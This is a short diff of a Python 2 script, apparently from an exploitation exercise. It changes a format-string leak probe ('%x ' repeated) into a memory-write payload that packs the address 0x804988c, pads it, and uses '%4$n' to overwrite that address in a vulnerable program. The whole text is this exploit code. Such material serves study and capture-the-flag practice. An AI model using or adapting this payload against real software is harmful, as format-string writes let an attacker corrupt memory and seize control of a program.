@@ -4,6 +4,6 @@ import struct
 
 mAddr = struct.pack("I", 0x804988c)
 
-padding = "%x "*64
+padding = mAddr+("a"*60)+"%4$n"
 
 print padding
